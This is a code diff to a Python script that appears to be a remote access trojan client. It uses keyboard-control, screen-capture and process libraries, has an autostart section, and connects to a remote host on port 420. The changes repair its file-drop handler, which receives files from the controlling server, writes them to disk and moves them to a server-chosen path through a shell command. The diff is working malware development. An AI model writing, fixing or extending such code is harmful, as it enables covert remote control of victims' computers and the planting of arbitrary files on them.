@@ -10,7 +10,6 @@ import pathlib
 
 try:
     import pynput
-    from pynput.keyboard import Controller, Key
     import mss
     import psutil
 except ModuleNotFoundError:
@@ -25,6 +24,8 @@ PORT = 420
 BUFFER = 4096
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
+from pynput.keyboard import Controller, Key
+
 keyboard = Controller()
 
 # the script for autostart
@@ -203,19 +204,23 @@ try:
                 client.send(b"err")
         # receives bytes
         elif ctype == "b":
-            end = ctype[2:]
+            end = message[2:]
             name = f"a{randint(111, 999)}{end}"
-            sendMsg(name)
+            client.send(str(len(name)).encode())
+            client.send(name.encode(FORMAT))
             file = client.recv(2048)
             while file:
-                with open(f"{name}", "a") as up:
+                with open(f"{name}", "ab") as up:
                     up.write(file)
-                if file[-4:] != "done":
-                    up.write(file)
+                if file[-4:] != b"done":
+                    file = client.recv(2048)
                 else:
-                    path = recvMsg()
+                    print("awaiting path")
+                    path = client.recv(2048).decode()
+                    print(path)
                     if exists(str(path)):
-                        call(["move", f"{name}", f'"{path}"'], shell=True)
+                        print(f'move {name} {path}')
+                        call([f'move', name, f'{path}'], shell=True)
                         sendMsg("succ")
                     else:
                         sendMsg("err")
